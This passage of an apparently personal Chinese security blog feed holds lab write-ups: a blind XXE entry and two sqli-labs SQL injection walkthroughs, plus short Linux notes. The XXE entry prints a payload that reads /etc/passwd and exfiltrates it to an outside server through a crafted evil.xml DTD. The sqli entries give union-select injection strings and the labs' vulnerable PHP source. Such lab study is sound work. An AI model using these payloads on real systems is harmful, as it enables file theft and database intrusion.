class="keyword">false</span>);</span><br><span class="line">$data = <span class="keyword">isset</span>($_POST[<span class="string">'data'</span>])?trim($_POST[<span class="string">'data'</span>]):<span class="string">''</span>;</span><br><span class="line">$resp = <span class="string">''</span>;</span><br><span class="line"><span class="keyword">if</span>($data != <span class="keyword">false</span>)&#123;</span><br><span class="line">    $xml = simplexml_load_string($data, <span class="string">'SimpleXMLElement'</span>, LIBXML_NOENT);</span><br><span class="line">    <span class="keyword">if</span>($xml &amp;&amp; <span class="keyword">isset</span>($xml-&gt;name))&#123;</span><br><span class="line">        $name = $xml-&gt;name;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="keyword">isset</span>($name)?<span class="string">'ok'</span>:<span class="string">'error'</span>;<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>经过测试发现仅返回ok或error；</p><p>源码中也可以看到：<code>echo isset($name)?&#39;ok&#39;:&#39;error&#39;;</code></p><p><strong>blind xxe思想就是将数据通过外部服务器或者报错信息带出来;</strong></p><p>构造如下payload：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0"?&gt;</span> </span><br><span class="line"><span class="meta">&lt;!DOCTYPE test[</span></span><br><span class="line"><span class="meta">   &lt;!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd"&gt;</span></span><br><span class="line"><span class="meta">   &lt;!ENTITY % dtd SYSTEM "http://192.168.40.128/evil.xml"&gt;      %dtd;</span></span><br><span class="line"><span class="meta">   %send; </span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">abc</span>&gt;</span><span class="tag">&lt;/<span class="name">abc</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="解析流程："><a href="#解析流程：" class="headerlink" title="解析流程："></a>解析流程：</h3><p>XML解析器：</p><ul><li><p>首先检查<strong>XML</strong>版本（依据版本进行解析处理）</p></li><li><p>检查文档类型定义的<strong>DTD</strong>（内联<strong>DTD</strong>）</p></li><li><p>解析器读取<code>php://filter/convert.base64-encode/resource=/etc/passwd</code>内容</p></li><li><p>将读取的内容存储到<strong>file</strong>实体中（用赋值来代替参数实体）</p></li><li><p><strong>dtd</strong>为参数实体，它的值为<code>http://192.168.40.128/evil.xml</code></p></li><li><p>引用参数实体<strong>dtd</strong></p></li><li><p>引用实体<strong>send</strong>，而<strong>send</strong>存在于<strong>evil.xml</strong>中</p></li></ul><p>+++</p><p>由于在内部DTD里，参数实体引用只能和元素同级而不能直接出现在元素声明内部，否则解析器会报错： <code>PEReferences forbidden in internal subset</code>。 所以，参数实体引用<code>%file;</code>必须放在外部文件里 。</p><p>所以我们在自己的服务器上创建evil.xml,并写入如下内容：</p><figure class="highlight erlang-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY <span class="comment">% payload "&lt;!ENTITY &amp;#x25; send SYSTEM 'http://192.168.40.128/?content=%file;'&gt;"&gt; </span></span><br><span class="line"><span class="comment">%payload;</span></span><br></pre></td></tr></table></figure><p>注意，因为这里是参数实体<strong>payload</strong>来<strong>嵌套定义</strong>参数实体<strong>send</strong>，所以被<strong>嵌套定义</strong>的参数实体<code>%</code>一定要HTML编码为：<code>&amp;#x25</code>;</p><p>此时，调用的过程就变为：参数实体<strong>dtd</strong>通过<strong>http</strong>协议来访问服务器上的<strong>evil.xml</strong>，然后返回<strong>evil.xml</strong>的内容，调用了参数实体<strong>payload</strong>，然后<strong>payload</strong>又调用了参数实体<strong>send</strong>，<strong>send</strong>的作用就是把参数实体<strong>file</strong>（即文件<strong>/etc/passwd</strong>的base64编码内容）发送到我们的服务器上,解密base64编码内容即可；</p><p><img src="https://s1.ax1x.com/2020/04/27/JfuBGT.png" alt="JfuBGT.png"></p><p>但是，如果目标靶机不允许我们访问外网，那么就需要用到另一种方法：利用本地dtd文件重新定义参数实体产生报错从而回显信息。</p><p>+++</p><h4 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h4><p>[1].<a href="https://nikoeurus.github.io/2019/11/06/XXE总结/#LookAround" target="_blank" rel="noopener">https://nikoeurus.github.io/2019/11/06/XXE%E6%80%BB%E7%BB%93/#LookAround</a></p><p>[2]. <a href="https://www.gosecure.net/blog/2019/07/16/automating-local-dtd-discovery-for-xxe-exploitation/" target="_blank" rel="noopener">https://www.gosecure.net/blog/2019/07/16/automating-local-dtd-discovery-for-xxe-exploitation/</a></p><p>[3].<a href="https://www.freebuf.com/vuls/207639.html" target="_blank" rel="noopener">https://www.freebuf.com/vuls/207639.html</a></p><p>[4].<a href="https://medium.com/hmif-itb/googlectf-2019-web-bnv-writeup-nicholas-rianto-putra-medium-b8e2d86d78b2" target="_blank" rel="noopener">https://medium.com/hmif-itb/googlectf-2019-web-bnv-writeup-nicholas-rianto-putra-medium-b8e2d86d78b2</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;[TOC]&lt;br&gt;[5]:()&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://s1.ax1x.com/2020/04/27/JfuUZn.png&quot; alt=&quot;JfuUZn.png&quot;&gt;&lt;/p&gt;
&lt;h2 id=&quot;1-DOMDocument-php&quot;&gt;&lt;a href=&quot;#1-
      
    
    </summary>
    
    
      <category term="XXE" scheme="https://singlemindedt.github.io/tags/XXE/"/>
    
  </entry>
  
  <entry>
    <title>操作系统安全</title>
    <link href="https://singlemindedt.github.io/2020/02/28/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8/"/>
    <id>https://singlemindedt.github.io/2020/02/28/操作系统安全/</id>
    <published>2020-02-28T02:26:23.000Z</published>
    <updated>2020-02-28T05:06:58.773Z</updated>
    
    <summary type="html">
    
    </summary>
    
    
      <category term="notes" scheme="https://singlemindedt.github.io/tags/notes/"/>
    
  </entry>
  
  <entry>
    <title>Linux操作系统</title>
    <link href="https://singlemindedt.github.io/2020/02/28/Linux%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
    <id>https://singlemindedt.github.io/2020/02/28/Linux操作系统/</id>
    <published>2020-02-28T01:29:23.000Z</published>
    <updated>2020-03-06T01:49:44.534Z</updated>
    
    <content type="html"><![CDATA[<h1 id="第四讲"><a href="#第四讲" class="headerlink" title="第四讲"></a>第四讲</h1><h2 id="用户组文件"><a href="#用户组文件" class="headerlink" title="用户组文件"></a>用户组文件</h2><h2 id="普通用户管理"><a href="#普通用户管理" class="headerlink" title="普通用户管理"></a>普通用户管理</h2><p>1.添加用户命令:useradd<br>2.更改用户口令命令：passwd</p><ul><li><input checked disabled type="checkbox"> 在创建Linux分区时,一定要创建两个分区:SWAP/ROOT</li></ul><p>3.who -u查已登录到系统的用户进程<br>4.kill -9 进程号</p><ol start="5"><li>su/sudo(受限的su,更安全；授权许可的su,配置文件/etc/sudoers)</li></ol><h1 id="shell编程"><a href="#shell编程" class="headerlink" title="shell编程"></a>shell编程</h1><ul><li><input checked disabled type="checkbox"> <p>Python表达式中，可以使用（ ）控制运算符的优先顺序。</p></li><li><input checked disabled type="checkbox"> <p>userdel myname 注：删除用户myname，但不删除其home目录及文件；</p></li><li><input checked disabled type="checkbox"> <p>userdel -r myname 注：删除用户mynamt，其home目录及其他文件一并删除；</p></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;第四讲&quot;&gt;&lt;a href=&quot;#第四讲&quot; class=&quot;headerlink&quot; title=&quot;第四讲&quot;&gt;&lt;/a&gt;第四讲&lt;/h1&gt;&lt;h2 id=&quot;用户组文件&quot;&gt;&lt;a href=&quot;#用户组文件&quot; class=&quot;headerlink&quot; title=&quot;用户组文件&quot;&gt;&lt;/a&gt;
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>sqli-labs-Page-1-Less-4</title>
    <link href="https://singlemindedt.github.io/2020/02/26/sqli-labs-Page-1-Less-4/"/>
    <id>https://singlemindedt.github.io/2020/02/26/sqli-labs-Page-1-Less-4/</id>
    <published>2020-02-26T10:41:44.000Z</published>
    <updated>2020-02-27T01:14:49.915Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Less-4（GET方式-基于双引号-string型）"><a href="#Less-4（GET方式-基于双引号-string型）" class="headerlink" title="Less-4（GET方式-基于双引号-string型）"></a>Less-4（GET方式-基于双引号-string型）</h2><p><img src="https://s2.ax1x.com/2020/02/27/3d9L6K.png" alt="3d9L6K.png"><br>根据页面提示：</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Please input <span class="keyword">the</span> ID <span class="keyword">as</span> parameter <span class="keyword">with</span> <span class="keyword">numeric</span> <span class="built_in">value</span></span><br></pre></td></tr></table></figure><ul><li>尝试通过get方式输入ID和数值参数：<br><font color="#ff000" face="黑体" size="4">?id=1</font></li></ul><p><img src="https://s2.ax1x.com/2020/02/27/3d9ql6.png" alt="3d9ql6.png"><br>成功得到查询结果；</p><hr><ul><li>添加单引号：<br><font color="#ff000" face="黑体" size="4">?id=1’</font></li></ul><p><img src="https://s2.ax1x.com/2020/02/27/3d9OOO.png" alt="3d9OOO.png"><br>语句正常执行；</p><hr><ul><li>添加双引号：<br><font color="#ff000" face="黑体" size="4">?id=1“</font></li></ul><p><img src="https://s2.ax1x.com/2020/02/27/3dCPpt.png" alt="3dCPpt.png"><br>出现了报错信息，仔细观察信息，可以看到报错信息里出现了多个双引号和一个圆括号，猜测可能为(“”)闭合方式；</p><hr><ul><li>添加双引号+）：<br><font color="#ff000" face="黑体" size="4">?id=1“）</font></li></ul><p><img src="https://s2.ax1x.com/2020/02/27/3dCPpt.png" alt="3dCPpt.png"><br>  看到出现了报错结果，错误就在”）附近；</p><hr><ul><li>添加双引号+）–+：<br><font color="#ff000" face="黑体" size="4">?id=1“）–+</font></li></ul><p><a href="https://imgchr.com/i/3d9xTH" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2020/02/27/3d9xTH.md.png" alt="3d9xTH.png" border="0"></a><br>成功查询到结果，基本可以确定为(“”)闭合方式；</p><hr><ul><li>尝试输入<font color="#ff000" face="黑体" size="4">?id=1“）and 1=2–+</font></li></ul><p><img src="https://s2.ax1x.com/2020/02/27/3d9bSx.png" alt="3d9bSx.png"><br>可以看到既无报错信息也没有回显任何内容，说明我们所输入的语法是对的，在1=2上存在逻辑错误，即<code>SELECT * FROM users WHERE id=(“1”)and 1=2--+”) LIMIT 0,1</code>；</p><hr><ul><li>尝试输入<font color="#ff000" face="黑体" size="4">?id=1”）and 1=1–+</font></li></ul><p><img src="https://s2.ax1x.com/2020/02/27/3d97f1.png" alt="3d97f1.png"><br>成功得到查询内容与<font color="#ff000" face="黑体" size="4">?id=1“）–+</font>结果一致，即语法和逻辑均正确，说明此处确为<strong>(“”)字符型注入</strong>；</p><hr><hr><p>==猜解数据库内容==<br>猜解过程与Page-1-Less-3基本相同，只是在原来的基础上将<strong>‘</strong>改为<strong>”</strong>，此处仅举一例；<br>例：利用显示位爆破数据库名：<br><font color="#ff0000" face="黑体" size="4">?id=-1”) union select 1,(select group_concat(schema_name) from information_schema.schemata),3 –+</font> </p><p><img src="https://s2.ax1x.com/2020/02/27/3d9jmD.png" alt="3d9jmD.png"><br>成功得到查询结果；</p><hr><ul><li>查看源码：<br>可以看到查询语句的格式为：<br><code>$id = &#39;&quot;&#39; . $id . &#39;&quot;&#39;;</code>//将ID变量与“连接；构成新的ID；<br><code>$sql=&quot;SELECT * FROM users WHERE id=($id) LIMIT 0,1&quot;;</code></li></ul><hr><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//including the Mysql connect parameters.</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">"../sql-connections/sql-connect.php"</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="comment">// take the variables</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'id'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">$id=$_GET[<span class="string">'id'</span>];</span><br><span class="line"><span class="comment">//logging the connection parameters to a file for analysis.</span></span><br><span class="line">$fp=fopen(<span class="string">'result.txt'</span>,<span class="string">'a'</span>);</span><br><span class="line">fwrite($fp,<span class="string">'ID:'</span>.$id.<span class="string">"\n"</span>);</span><br><span class="line">fclose($fp);</span><br><span class="line"></span><br><span class="line"><span class="comment">// connectivity </span></span><br><span class="line"></span><br><span class="line">$id = <span class="string">'"'</span> . $id . <span class="string">'"'</span>;</span><br><span class="line">$sql=<span class="string">"SELECT * FROM users WHERE id=($id) LIMIT 0,1"</span>;</span><br><span class="line">$result=mysql_query($sql);</span><br><span class="line">$row = mysql_fetch_array($result);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($row)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"&lt;font size='5' color= '#99FF00'&gt;"</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">'Your Login name:'</span>. $row[<span class="string">'username'</span>];</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">'Your Password:'</span> .$row[<span class="string">'password'</span>];</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"&lt;/font&gt;"</span>;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;font color= "#FFFF00"&gt;'</span>;</span><br><span class="line">print_r(mysql_error());</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;/font&gt;"</span>;  </span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123; <span class="keyword">echo</span> <span class="string">"Please input the ID as parameter with numeric value"</span>;&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;Less-4（GET方式-基于双引号-string型）&quot;&gt;&lt;a href=&quot;#Less-4（GET方式-基于双引号-string型）&quot; class=&quot;headerlink&quot; title=&quot;Less-4（GET方式-基于双引号-string型）&quot;&gt;&lt;/a&gt;Less-
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>sqli-labs-Page-1-Less-3</title>
    <link href="https://singlemindedt.github.io/2020/02/25/sqli-labs-Page-1-Less-3/"/>
    <id>https://singlemindedt.github.io/2020/02/25/sqli-labs-Page-1-Less-3/</id>
    <published>2020-02-25T02:25:38.000Z</published>
    <updated>2020-02-27T01:15:51.677Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Less-3-（GET方式-基于单引号变形-string型）"><a href="#Less-3-（GET方式-基于单引号变形-string型）" class="headerlink" title="Less-3 （GET方式-基于单引号变形-string型）"></a>Less-3 （GET方式-基于单引号变形-string型）</h2><p><img src="https://s2.ax1x.com/2020/02/25/3YwyNj.png" alt="3YwyNj.png"><br>根据页面提示：</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Please input <span class="keyword">the</span> ID <span class="keyword">as</span> parameter <span class="keyword">with</span> <span class="keyword">numeric</span> <span class="built_in">value</span></span><br></pre></td></tr></table></figure><ul><li>尝试通过get方式输入ID和数值参数：<br><font color="#ff000" face="黑体" size="4">?id=1</font></li></ul><p><img src="https://s2.ax1x.com/2020/02/25/3YwRg0.png" alt="3YwRg0.png"><br>成功得到查询结果；</p><hr><ul><li>添加单引号：<br><font color="#ff000" face="黑体" size="4">?id=1’</font></li></ul><p><img src="https://s2.ax1x.com/2020/02/25/3Yw23q.png" alt="3Yw23q.png"><br>得到报错信息，即我们所输入的单引号与查询语句格式不匹配，从报错信息还可以看出可能与’）‘有关，猜测可能为单引号多余或者闭合格式为（’‘）造成；</p><hr><ul><li>加入注释符：<br><font color="#ff000" face="黑体" size="4">?id=1’–+</font></li></ul><p><img src="https://s2.ax1x.com/2020/02/25/3Yw64s.png" alt="3Yw64s.png"><br>可以看出还是回显报错信息，并且错误之处还是在单引号附近；</p><hr><ul><li>加单引号+）+注释符</li></ul><p><font color="#ff000" face="黑体" size="4">?id=1’）–+</font></p><p><img src="https://s2.ax1x.com/2020/02/25/3Y6wJe.png" alt="3Y6wJe.png"><br>看到成功得到查询内容，所以该处的闭合方式为<strong>(‘’)</strong>;</p><hr><ul><li>尝试输入<font color="#ff000" face="黑体" size="4">?id=1’）and 1=2–+</font></li></ul><p><img src="https://s2.ax1x.com/2020/02/25/3YREfU.png" alt="3YREfU.png"><br>可以看到既无报错信息也没有回显任何内容，说明我们所输入的语法是对的，在1=2上存在逻辑错误，即<code>SELECT * FROM users WHERE id=(&#39;1&#39;)and 1=2--+&#39;) LIMIT 0,1</code>；</p><hr><ul><li>尝试输入<font color="#ff000" face="黑体" size="4">?id=1’）and 1=1–+</font></li></ul><p><img src="https://s2.ax1x.com/2020/02/25/3YRel4.png" alt="3YRel4.png"><br>成功得到查询内容，说明此处确为<strong>(‘’)字符型注入；</strong></p><hr><hr><p>==猜解数据库内容==<br>猜解过程与Page-1-Less-1基本相同，只是在原来的基础上加一个“)”，此处仅举一例；<br>例：数据库版本，库名：<br><font color="#ff000" face="黑体" size="4">?id=-1’) union select 1,version(),database() –+</font></p><p><img src="https://s2.ax1x.com/2020/02/25/3YTkz6.png" alt="3YTkz6.png"><br>成功得到结果；</p><hr><ul><li>查看源码：<br>可以看到查询语句的格式为：<code>SELECT * FROM users WHERE id=(&#39;$id&#39;) LIMIT 0,1</code></li></ul><hr><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//including the Mysql connect parameters.</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">"../sql-connections/sql-connect.php"</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="comment">// take the variables</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'id'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">$id=$_GET[<span class="string">'id'</span>];</span><br><span class="line"><span class="comment">//logging the connection parameters to a file for analysis.</span></span><br><span class="line">$fp=fopen(<span class="string">'result.txt'</span>,<span class="string">'a'</span>);</span><br><span class="line">fwrite($fp,<span class="string">'ID:'</span>.$id.<span class="string">"\n"</span>);</span><br><span class="line">fclose($fp);</span><br><span class="line"></span><br><span class="line"><span class="comment">// connectivity </span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$sql=<span class="string">"SELECT * FROM users WHERE id=('$id') LIMIT 0,1"</span>;</span><br><span class="line">$result=mysql_query($sql);</span><br><span class="line">$row = mysql_fetch_array($result);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($row)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"&lt;font size='5' color= '#99FF00'&gt;"</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">'Your Login name:'</span>. $row[<span class="string">'username'</span>];</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">'Your Password:'</span> .$row[<span class="string">'password'</span>];</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"&lt;/font&gt;"</span>;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;font color= "#FFFF00"&gt;'</span>;</span><br><span class="line">print_r(mysql_error());</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;/font&gt;"</span>;  </span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123; <span class="keyword">echo</span> <span class="string">"Please input the ID as parameter with numeric value"</span>;&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;Less-3-（GET方式-基于单引号变形-string型）&quot;&gt;&lt;a href=&quot;#Less-3-（GET方式-基于单引号变形-string型）&quot; class=&quot;headerlink&quot; title=&quot;Less-3 （GET方式-基于单引号变形-string型）&quot;&gt;
      
    
    </summary>
    
    
      <category term="SQL" scheme="https://singlemindedt.github.io/tags/SQL/"/>
    
  </entry>
  
</feed>
